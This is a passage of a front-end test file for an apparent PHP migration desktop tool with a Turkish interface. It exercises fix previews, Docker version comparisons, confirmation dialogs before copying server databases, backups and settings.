    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByText(/otomatik, 1 gözden geçirilecek dosya\./)).toBeInTheDocument();
    expect(within(dialog).getByText("Gözden geçirilecek 1 dosyanın farkına henüz bakmadınız.")).toBeInTheDocument();
  });

  it("narrows the selection by rule and warns about uncommitted files", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await screen.findByRole("list", { name: "Dosyalar" });
    await pick(user, "Seçimi daralt", "Yalnızca otomatik düzeltmeler");
    const autoCount = screen.getByText(/ \/ 4 dosya seçili/).textContent;
    expect(autoCount).not.toBe("4 / 4 dosya seçili");
    await pick(user, "Seçimi daralt", "Tüm dosyalar");
    await user.click(screen.getByRole("button", { name: "Tümünü uygula" }));
    const dialog = await screen.findByRole("dialog");
    expect(await within(dialog).findByText("1 dosyada commit edilmemiş değişiklik var")).toBeInTheDocument();
    await user.click(within(dialog).getByText("Önerilen commit mesajı"));
    expect(within(dialog).getByText(/PHP 8.4 uyumluluğu: Rector ile 4 dosya/)).toBeInTheDocument();
  });

  it("lints and runs tests with a local PHP of the target", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await more(user, "Sözdizimini PHP 8.4.27 ile denetle");
    expect(await screen.findByText(/php -l · PHP 8.4: 31 farklı mesaj/)).toBeInTheDocument();
    expect(screen.getByText("128 dosyanın sözdizimi denetlendi, hata yok.")).toBeInTheDocument();
    await more(user, "Testleri PHP 8.4.27 ile çalıştır");
    const dialog = await screen.findByRole("dialog", { name: "Projenin testleri çalıştırılsın mı?" });
    await user.click(within(dialog).getByRole("button", { name: "Testleri çalıştır" }));
    expect(await screen.findByText(/PHPUnit · PHP 8.4: 31 farklı mesaj/)).toBeInTheDocument();
    expect(screen.getByText("Testler geçti.")).toBeInTheDocument();
  });

  it("folds the options around a Real test and reports each stage", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let release: () => void = () => {};
    const compare = api.dockerCompare.bind(api);
    api.dockerCompare = async (...args) => {
      await new Promise<void>((resolve) => (release = resolve));
      return compare(...args);
    };
    let emit: (step: DockerStep) => void = () => {};
    api.onDockerStep = async (listener) => {
      emit = listener;
      return () => {};
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    const saveOptions = { name: "Seçenekleri projeye kaydet" };
    expect(screen.queryByRole("button", saveOptions)).not.toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Seçenekler" }));
    expect(await screen.findByRole("button", saveOptions)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Testi başlat" }));
    await waitFor(() => expect(screen.queryByRole("button", saveOptions)).not.toBeInTheDocument());
    act(() => emit({ step: "pages", version: "8.4" }));
    const lanes = within(screen.getByRole("region", { name: "Test ilerlemesi" }));
    expect(lanes.getByText("Sayfalar PHP 8.4 ile açılıyor…")).toBeInTheDocument();
    const states = [...document.querySelectorAll(".docker-lane li")].map((li) => (li as HTMLElement).dataset.state);
    expect(states).toEqual(["done", "done", "done", "done", "done", "done", "active", "waiting"]);
    release();
    expect(await screen.findByText("PHP 8.4 sürümünde yeni sorunlar var.")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Yeniden test et" }));
    expect(await screen.findByRole("button", { name: "Testi başlat" })).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Sonuca dön" }));
    expect(await screen.findByText("PHP 8.4 sürümünde yeni sorunlar var.")).toBeInTheDocument();
  });

  it("turns the database on from the Real test scope", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    const data = await screen.findByRole("switch", { name: "Veritabanı" });
    expect(data).not.toBeChecked();
    await waitFor(async () => {
      await user.click(data);
      expect(await screen.findByText("database/dump.sql")).toBeInTheDocument();
    });
    expect(data).toBeChecked();
    await user.click(data);
    expect(screen.queryByText("database/dump.sql")).not.toBeInTheDocument();
  });

  it("opens the code behind a new message and each run's output", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    const row = await screen.findByRole("button", { name: /Call to undefined function each/ });
    expect(row).toHaveAttribute("aria-expanded", "false");
    await user.click(row);
    expect(row).toHaveAttribute("aria-expanded", "true");
    await waitFor(() => expect(document.querySelector(".real-event .code-line--hit")).not.toBeNull());
    await user.click(screen.getByRole("button", { name: /PHP 7\.4 çıktısı/ }));
    expect(await screen.findByRole("dialog", { name: "PHP 7.4 çıktısı" })).toBeInTheDocument();
  });

  it("compares two versions in Docker and feeds the findings", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0 })} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    expect(await screen.findByText("PHP 8.4 sürümünde yeni sorunlar var.")).toBeInTheDocument();
    expect(screen.getByText("Error: Call to undefined function each()")).toBeInTheDocument();
    expect(screen.getByText("1 test başarısız")).toBeInTheDocument();
    expect(screen.getByText("CartTest::testTotal")).toBeInTheDocument();
    expect(screen.getByText("Farklı sayfa").nextElementSibling).toHaveTextContent("1 / 2");
    expect(screen.getByText("/cart.php")).toBeInTheDocument();
    expect(screen.getAllByText("mysqli")).toHaveLength(2);
    await user.click(screen.getByRole("button", { name: "Bulgularda göster" }));
    expect(await screen.findByText(/Docker · PHP .* → 8.4: 31 farklı mesaj/)).toBeInTheDocument();
    await user.click(nav(/Genel bakış/));
    const real = within(await screen.findByRole("list", { name: "Geçiş adımları" })).getByRole("button", { name: /Gerçek test/ });
    expect(real).toHaveAttribute("title", "Yeni sorunlar var");
    expect(real.parentElement).toHaveAttribute("data-state", "blocked");
    await user.click(nav(/Geçmiş/));
    const checks = (await screen.findByText("Son kontroller")).closest(".card") as HTMLElement;
    expect(within(checks).getByText("Gerçek test")).toBeInTheDocument();
    expect(screen.queryByText("Sunucudaki proje kökü")).not.toBeInTheDocument();
  });

  it("applies only the hunks left on", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const apply = vi.spyOn(api, "applyChanges");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: "Önizlemeyi hazırla" }));
    const hunks = await screen.findAllByRole("checkbox", { name: /satırdaki değişikliği uygula/ });
    const file = hunks[0].closest("[role=region]")?.getAttribute("aria-label")?.replace(" değişiklikleri", "") ?? "";
    await user.click(hunks[0]);
    expect(hunks[0]).toBeChecked();
    await user.click(screen.getByRole("button", { name: /dosyayı uygula/ }));
    const dialog = await screen.findByRole("dialog");
    await user.click(within(dialog).getByRole("button", { name: /uygula/i }));
    await waitFor(() => expect(apply).toHaveBeenCalled());
    expect(apply.mock.calls[0][2]).toContain(file);
  });

  it("compares with a copy of the project's database", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0 })} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Seçenekler" }));
    await pick(user, "Veritabanı", "Canlı kopya: magaza (127.0.0.1)");
    expect(screen.getByText(/Canlı veritabanınıza yazılmaz/)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Testi başlat" }));
    expect(await screen.findByText("Farklı tablo")).toBeInTheDocument();
    expect(screen.getByText("orders")).toBeInTheDocument();
  });

  it("asks before copying a database from a server", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const compare = vi.spyOn(api, "dockerCompare");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Seçenekler" }));
    await pick(user, "Veritabanı", "Sunucudan kopyala (SSH)");
    await user.type(screen.getByRole("combobox", { name: "SSH sunucusu" }), "prod");
    await user.type(screen.getByRole("textbox", { name: "Veritabanı adı" }), "magaza");
    await user.type(screen.getByRole("textbox", { name: "Veritabanı kullanıcısı" }), "app");
    await user.click(screen.getByRole("button", { name: "Testi başlat" }));
    const dialog = await screen.findByRole("dialog", { name: "Sunucudaki veri kopyalansın mı?" });
    expect(within(dialog).getByText(/prod sunucusundaki magaza/)).toBeInTheDocument();
    expect(compare).not.toHaveBeenCalled();
    await user.click(within(dialog).getByRole("button", { name: "Kopyala ve test et" }));
    await waitFor(() => expect(compare).toHaveBeenCalled());
    expect(compare.mock.calls[0][6]).toEqual({ kind: "ssh", host: "prod", engine: "mysql", name: "magaza", user: "app", sendPassword: false });
  });

  it("tries fixes in a copy and writes them only after the result is shown", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const compare = vi.spyOn(api, "dockerCompare");
    const apply = vi.spyOn(api, "applyChanges");
    const keep = vi.spyOn(api, "keepDockerTrial");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    await user.click(await screen.findByRole("button", { name: "Düzeltmeleri hazırla" }));
    expect(await screen.findByText(/Yeni 1 mesajdan 1 tanesi/)).toBeInTheDocument();
    expect(screen.getByText("1 sorunla ilgili")).toBeInTheDocument();
    expect(screen.getByRole("checkbox", { name: /includes\/class-cart.php/ })).toBeChecked();
    await user.click(screen.getByRole("button", { name: /geçici kopyada dene/ }));
    await screen.findByText(/sürümüne özgü sorun kalmadı/);
    const fix = compare.mock.calls.at(-1)?.[9];
    expect(fix?.files).toContain("includes/class-cart.php");
    expect(apply).not.toHaveBeenCalled();
    await user.click(screen.getByRole("button", { name: /dosyayı projeye yaz/ }));
    const dialog = await screen.findByRole("dialog", { name: "Düzeltmeler projeye yazılsın mı?" });
    await user.click(within(dialog).getByRole("button", { name: "Projeye yaz" }));
    await waitFor(() => expect(keep).toHaveBeenCalled());
    expect(apply.mock.calls[0][2]).toEqual(fix?.files);
    expect(apply.mock.calls[0][4]).toEqual(fix?.skipped);
  });

  it("tries the hunks left on and writes exactly those", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const compare = vi.spyOn(api, "dockerCompare");
    const apply = vi.spyOn(api, "applyChanges");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: "Önizlemeyi hazırla" }));
    const hunks = await screen.findAllByRole("checkbox", { name: /satırdaki değişikliği uygula/ });
    await user.click(hunks[0]);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    await user.click(await screen.findByRole("button", { name: /geçici kopyada dene/ }));
    await screen.findByText(/sürümüne özgü sorun kalmadı/);
    const fix = compare.mock.calls.at(-1)?.[9];
    expect(Object.keys(fix?.skipped ?? {})).toHaveLength(1);
    await user.click(screen.getByRole("button", { name: /dosyayı projeye yaz/ }));
    const dialog = await screen.findByRole("dialog", { name: "Düzeltmeler projeye yazılsın mı?" });
    await user.click(within(dialog).getByRole("button", { name: "Projeye yaz" }));
    await waitFor(() => expect(apply).toHaveBeenCalled());
    expect(apply.mock.calls[0][4]).toEqual(fix?.skipped);
  });

  it("keeps warning about an interrupted write until it is checked", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    vi.spyOn(api, "interruptedWrites").mockResolvedValue([{ id: "s1", label: "Yarım iş", createdAt: 1, files: [] } as never]);
    const dismiss = vi.spyOn(api, "dismissInterrupted");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(await screen.findByRole("button", { name: "Dosyaları kontrol ettim" }));
    expect(dismiss).toHaveBeenCalledWith(expect.any(String), "s1");
  });

  it("opens with the project's saved settings and saves them back", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, config: { target: "8.3", exclude: ["legacy"], baseline: null, docker: { source: "8.0", extensions: false, pages: ["/shop"], dump: null, prepare: "make assets", test: "vendor/bin/pest" }, git: { requireClean: false, branchPerBatch: false } } });
    const compare = vi.spyOn(api, "dockerCompare");
    const save = vi.spyOn(api, "saveProjectConfig");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Seçenekler" }));
    expect(await screen.findByDisplayValue("vendor/bin/pest")).toBeInTheDocument();
    expect(screen.getByDisplayValue("make assets")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Testi başlat" }));
    await user.click(await screen.findByRole("button", { name: "Çalıştır ve test et" }));
    await waitFor(() => expect(compare).toHaveBeenCalled());
    const call = compare.mock.calls[0];
    expect([call[1], call[2], call[3], call[5], call[7], call[8]]).toEqual(["8.0", "8.3", false, ["/shop"], "make assets", "vendor/bin/pest"]);
    await screen.findByText("PHP 8.3 sürümünde yeni sorunlar var.");
    await user.click(screen.getByRole("button", { name: "Yeniden test et" }));
    await user.click(await screen.findByRole("button", { name: "Seçenekler" }));
    await user.click(await screen.findByRole("button", { name: "Seçenekleri projeye kaydet" }));
    await waitFor(() => expect(save).toHaveBeenCalled());
    expect(save.mock.calls[0][1]).toMatchObject({ target: "8.3", exclude: ["legacy"], docker: { test: "vendor/bin/pest", pages: ["/shop"] } });
  });

  it("says where new messages come from and finds a package's next version", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const find = vi.spyOn(api, "findCompatibleVersions");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    expect(await screen.findByText("Yeni mesajlar nereden geliyor")).toBeInTheDocument();
    expect(screen.getByText("Önce WordPress'i güncelleyin.")).toBeInTheDocument();
    expect(screen.getByText("acme/mailer 1.4.0")).toBeInTheDocument();
    expect(find).not.toHaveBeenCalled();
    await user.click(screen.getByRole("button", { name: "Uyumlu sürümleri bul" }));
    await waitFor(() => expect(find).toHaveBeenCalled());
    expect(await screen.findByText(/composer require acme\/mailer:\^/)).toBeInTheDocument();
  });

  it("asks again before a trial copies data from a server", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const compare = vi.spyOn(api, "dockerCompare");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Seçenekler" }));
    await pick(user, "Veritabanı", "Sunucudan kopyala (SSH)");
    await user.type(screen.getByRole("combobox", { name: "SSH sunucusu" }), "prod");
    await user.type(screen.getByRole("textbox", { name: "Veritabanı adı" }), "magaza");
    await user.type(screen.getByRole("textbox", { name: "Veritabanı kullanıcısı" }), "app");
    await user.click(screen.getByRole("button", { name: "Testi başlat" }));
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Kopyala ve test et" }));
    await user.click(await screen.findByRole("button", { name: "Düzeltmeleri hazırla" }));
    await user.click(await screen.findByRole("button", { name: /geçici kopyada dene/ }));
    const dialog = await screen.findByRole("dialog", { name: "Sunucudaki veri kopyalansın mı?" });
    expect(within(dialog).getByText(/prod sunucusundaki magaza/)).toBeInTheDocument();
    expect(compare).toHaveBeenCalledTimes(1);
    await user.click(within(dialog).getByRole("button", { name: "Kopyala ve test et" }));
    await waitFor(() => expect(compare).toHaveBeenCalledTimes(2));
  });

  it("removes prepared Docker images from the settings", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0 })} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    await screen.findByText("PHP 8.4 sürümünde yeni sorunlar var.");
    await user.click(screen.getByRole("button", { name: /Ayarlar/ }));
    expect(await screen.findByText(/Ferry'nin hazırladığı 2 kalıp, yaklaşık/)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Kalıpları sil" }));
    const dialog = await screen.findByRole("dialog", { name: "Docker kalıpları silinsin mi?" });
    await user.click(within(dialog).getByRole("button", { name: "Sil" }));
    expect(await screen.findByText("Ferry'nin hazırladığı kalıp yok.")).toBeInTheDocument();
  });

  it("narrows an imported log to the project root on the server", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0 })} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await more(user, "Log içe aktar");
    expect(await screen.findByText(/php_errors.log: 31 farklı mesaj/)).toBeInTheDocument();
    await user.click(screen.getByText("Sunucudaki proje kökü"));
    await user.type(screen.getByRole("textbox", { name: "Sunucudaki proje kökü" }), "/var/www/site");
    await user.click(screen.getByRole("button", { name: "Uygula" }));
    expect(await screen.findByText("Sunucudaki proje kökü: /var/www/site")).toBeInTheDocument();
  });

  it("shows a failed test run even when it reports no PHP messages", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.runLocalCheck;
    api.runLocalCheck = async (...args) => {
      const result = await real(...args);
      const check = { ...result.runtime!.check!, passed: false, exitCode: 1, log: "There was 1 failure:\n1) assertion failed\n" };
      return { ...result, runtime: { ...result.runtime!, check } };
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await more(user, "Testleri PHP 8.4.27 ile çalıştır");
    const dialog = await screen.findByRole("dialog", { name: "Projenin testleri çalıştırılsın mı?" });
    await user.click(within(dialog).getByRole("button", { name: "Testleri çalıştır" }));
    expect(await screen.findByText("Testler başarısız oldu (çıkış kodu 1).")).toBeInTheDocument();
    await user.click(screen.getByText("Çıktıyı göster"));
    expect(screen.getByText(/assertion failed/)).toBeVisible();
  });

  it("marks incomplete and failed targets in the comparison", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.compareTargets;
    api.compareTargets = async (...args) => {
      const rows = await real(...args);
      return rows.map((r, n) => (n === 0 ? { ...r, incomplete: true } : n === 1 ? { ...r, incomplete: true, error: "Bu hedef karşılaştırılamadı: boom" } : r));
    };
    render(<App api={api} />);
    await openAndScan(user);
    await compareTargets(user);
    const table = await screen.findByRole("table", { name: "Hedefleri karşılaştır" });
    expect(within(table).getByText("Bazı dosyalar taranamadı")).toBeInTheDocument();
    expect(within(table).getByText("Bu hedef karşılaştırılamadı: boom")).toBeInTheDocument();
  });

  it("compares targets and switches to one", async () => {
    const user = setup();
    await openAndScan(user);
    await compareTargets(user);
    const table = await screen.findByRole("table", { name: "Hedefleri karşılaştır" });
    expect(within(table).getAllByRole("row")).toHaveLength(5);
    expect(within(table).getByText("Seçili")).toBeInTheDocument();
    await user.click(within(table).getAllByRole("button", { name: "Bu hedefe geç" })[0]);
    await waitFor(() => expect(targetBox()).toHaveTextContent("PHP 8.2"));
  });

  it("saves the editor used to open findings", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await pick(user, "Editör", "PhpStorm");
    await waitFor(async () => expect((await api.getSettings()).editor).toBe("phpstorm"));
  });

  it("renders long finding lists in pages and extends them on demand", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0, scale: 40 })} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const list = await screen.findByRole("listbox", { name: "Bulgu listesi" });
    expect(within(list).getAllByRole("option")).toHaveLength(300);
    expect(screen.getAllByText(/840/).length).toBeGreaterThan(0);
    await user.click(screen.getByRole("button", { name: "300 bulgu daha göster (540 kaldı)" }));
    expect(within(list).getAllByRole("option")).toHaveLength(600);

    const options = within(list).getAllByRole("option");
    await user.click(options[599]);
    await user.keyboard("{ArrowDown}");
    await waitFor(() => expect(screen.getByRole("button", { name: /Önceki 300 bulguyu göster/ })).toBeInTheDocument());
    expect(within(list).getAllByRole("option")).toHaveLength(300);
    expect(within(list).getAllByRole("option")[150]).toHaveAttribute("aria-selected", "true");

    within(list).getAllByRole("option")[150].focus();
    await user.keyboard("{End}");
    await waitFor(() => expect(within(list).getAllByRole("option").at(-1)).toHaveAttribute("aria-selected", "true"));
    expect(within(list).getAllByRole("option")).toHaveLength(300);
    expect(screen.queryByRole("button", { name: /daha göster/ })).not.toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: /Önceki 300 bulguyu göster/ }));
    expect(within(list).getAllByRole("option")).toHaveLength(600);
  });

  it("stops a Real test when its project is left, and Stop reaches that project", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let reject: (e: Error) => void = () => {};
    api.dockerCompare = () => new Promise((_, r) => (reject = r));
    const cancel = vi.spyOn(api, "cancelDockerCompare").mockImplementation(async () => reject(new Error("durduruldu")));
    let open = 0;
    const inspect = api.inspectProject.bind(api);
    api.inspectProject = async (path) => {
      const info = await inspect(path);
      return { ...info, root: `/sites/${open++}` };
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    await user.click(nav(/Genel bakış/));
    expect(await screen.findByRole("combobox", { name: "Hedef PHP sürümü" })).toBeDisabled();
    await user.click(document.querySelector<HTMLElement>(".project-chip")!);
    await waitFor(() => expect(cancel).toHaveBeenCalledWith("/sites/0"));
    expect(await screen.findByText("Başka projeye geçtiğiniz için Gerçek test durduruldu.")).toBeInTheDocument();
    expect(screen.queryByText("Test tamamlanamadı")).not.toBeInTheDocument();
    expect(await screen.findByRole("radio", { name: "8.5" })).toBeEnabled();
  });

  it("does not stay in the opening state when a second folder dialog is dismissed", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    render(<App api={api} />);
    await openAndScan(user);
    const chip = () => document.querySelector<HTMLButtonElement>(".project-chip")!;
    let pick: (path: string) => void = () => {};
    const first = new Promise<string>((resolve) => (pick = resolve));
    const dialogs = [first, Promise.resolve(null)];
    api.pickProjectFolder = () => dialogs.shift()!;
    await user.click(chip());
    await user.click(chip());
    pick("/sites/shop");
    await waitFor(() => expect(chip()).toBeEnabled());
  });

  it("runs the tests behind the dialog and can stop them", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let reject: (e: Error) => void = () => {};
    api.runLocalCheck = () => new Promise((_, r) => (reject = r));
    const cancel = vi.spyOn(api, "cancelLocalCheck").mockImplementation(async () => reject(new Error("durduruldu")));
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await more(user, "Testleri PHP 8.4.27 ile çalıştır");
    const dialog = await screen.findByRole("dialog", { name: "Projenin testleri çalıştırılsın mı?" });
    await user.click(within(dialog).getByRole("button", { name: "Testleri çalıştır" }));
    await more(user, "Testleri durdur");
    expect(cancel).toHaveBeenCalled();
    await waitFor(() => expect(screen.getByRole("button", { name: "Diğer" }).querySelector(".spinner")).toBeNull());
    expect(screen.queryByText("Kontrol çalıştırılamadı")).not.toBeInTheDocument();
  });

  it("previews, applies and restores changes", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    const files = await screen.findByRole("list", { name: "Dosyalar" });
    expect(within(files).getAllByRole("listitem")).toHaveLength(4);
    await user.click(screen.getByRole("checkbox", { name: "Tümünü seç" }));
    expect(screen.getByText("4 / 4 dosya seçili")).toBeInTheDocument();

    await user.click(screen.getByRole("checkbox", { name: "includes/helpers.php dosyasını seçin" }));
    expect(screen.getByText("3 / 4 dosya seçili")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "3 dosyayı uygula" }));
    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByRole("heading", { name: "3 dosya güncellensin mi?" })).toBeInTheDocument();
    await user.click(within(dialog).getByRole("button", { name: "Uygula" }));

    expect(await screen.findByText("3 dosya güncellendi")).toBeInTheDocument();
    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
    expect(within(screen.getByRole("list", { name: "Dosyalar" })).getAllByRole("listitem")).toHaveLength(1);
    expect(screen.getByRole("checkbox", { name: "includes/helpers.php dosyasını seçin" })).not.toBeChecked();
    expect(screen.getByText("0 / 1 dosya seçili")).toBeInTheDocument();

    await user.click(nav(/Geçmiş/));
    await user.click(await screen.findByRole("button", { name: "Uyumluluk düzeltmeleri · PHP 8.4: incele" }));
    const review = await screen.findByRole("dialog", { name: /Uyumluluk düzeltmeleri/ });
    expect(await within(review).findByText("3 dosya", { exact: false })).toBeInTheDocument();
    expect(within(review).getByRole("region", { name: /değişiklikleri/ })).toBeInTheDocument();
    expect(within(review).queryByRole("button", { name: /helpers\.php/ })).not.toBeInTheDocument();
    await user.click(within(review).getByRole("button", { name: /Geri al/ }));
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Geri al" }));
    expect(await screen.findByText("Geri yüklendi")).toBeInTheDocument();
  });

  it("adds a project folder to the exclude list and refuses one outside it", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const root = (await api.pickProjectFolder("")) as string;
    const folders = [`${root}/legacy/old`, "/somewhere/else"];
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: "Proje klasörü seçin" }));
    api.pickProjectFolder = async () => folders.shift() ?? null;
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await user.click(await screen.findByRole("button", { name: "Klasör seç" }));
    expect(await screen.findByText("legacy/old")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Klasör seç" }));
    expect(await screen.findByText("Klasör projenin içinde olmalı.")).toBeInTheDocument();
  });

  it("offers the automatic PHP only after one has been chosen", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await screen.findByRole("heading", { name: "Araçlar" });
    expect(screen.queryByRole("button", { name: "Otomatik" })).not.toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Seç" }));
    await user.click(await screen.findByRole("button", { name: "Otomatik" }));
    await waitFor(() => expect(screen.queryByRole("button", { name: "Otomatik" })).not.toBeInTheDocument());
  });

  it("switches theme from settings", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await user.click(await screen.findByRole("radio", { name: /Koyu/ }));
    expect(document.documentElement.dataset.theme).toBe("dark");
    await user.click(screen.getByRole("radio", { name: /Açık/ }));
    expect(document.documentElement.dataset.theme).toBe("light");
    expect(JSON.parse(localStorage.getItem("ferry.theme")!)).toBe("light");
  });

  it("keeps the PHP path when the backup limit changes", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    await api.saveSettings({ phpPath: "/opt/php", snapshotLimit: null, editor: null, editorCommand: null, aiProjects: [] });
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    const group = await screen.findByRole("radiogroup", { name: "Saklanacak yedek" });
    await user.click(within(group).getByRole("radio", { name: "30" }));
    await waitFor(async () => expect(await api.getSettings()).toEqual({ phpPath: "/opt/php", snapshotLimit: 30, editor: null, editorCommand: null, aiProjects: [] }));
    expect(within(group).getByRole("radio", { name: "30" })).toHaveAttribute("aria-checked", "true");
  });

  it("keeps both settings when they change in quick succession", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.saveSettings;
    api.saveSettings = async (next) => {
      await new Promise((r) => setTimeout(r, 80));
      return real(next);
    };
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    const group = await screen.findByRole("radiogroup", { name: "Saklanacak yedek" });
    await user.click(within(group).getByRole("radio", { name: "30" }));
    await pick(user, "Editör", "Visual Studio Code");
    await waitFor(async () => expect(await api.getSettings()).toEqual({ phpPath: null, snapshotLimit: 30, editor: "vscode", editorCommand: null, aiProjects: [] }));
  });

  it("shows backup disk usage and deletes every backup after confirming", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(screen.getByRole("button", { name: /Ayarlar/ }));
    expect(await screen.findByText(/1 projede \d+ yedek, [\d,.]+ (kB|KB)\./)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Tüm yedekleri sil" }));
    const dialog = await screen.findByRole("dialog", { name: "Tüm projelerin yedekleri silinsin mi?" });
    expect(within(dialog).getByRole("button", { name: "Vazgeç" })).toHaveFocus();
    await user.click(within(dialog).getByRole("button", { name: "Sil" }));
    expect(await screen.findByText("Tüm yedekler silindi")).toBeInTheDocument();
    expect(await screen.findByText("Henüz yedek yok.")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Tüm yedekleri sil" })).toBeDisabled();
    await user.click(nav(/Geçmiş/));
    expect(await screen.findByText("Henüz bir değişiklik uygulanmadı")).toBeInTheDocument();
  });

  it("warns when the applied files fail php -l", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.applyChanges;
    api.applyChanges = async (...args) => ({ ...(await real(...args)), lintErrors: ["includes/helpers.php — Parse error on line 3"] });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await user.click(await screen.findByRole("checkbox", { name: "Tümünü seç" }));
    await user.click(await screen.findByRole("button", { name: "Tümünü uygula" }));
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Uygula" }));
    const alert = await screen.findByText("4 dosya güncellendi, 1 dosyada sözdizimi hatası var");
    expect(alert.closest("[role=alert]")).toHaveTextContent("includes/helpers.php — Parse error on line 3");
  });

  it("applies the chosen theme to the native window too", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const themes: (string | null)[] = [];
    api.setWindowTheme = async (theme) => {
      themes.push(theme);
    };
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await user.click(await screen.findByRole("radio", { name: /Açık/ }));
    await user.click(screen.getByRole("radio", { name: /Koyu/ }));
    await user.click(screen.getByRole("radio", { name: /Sistem/ }));
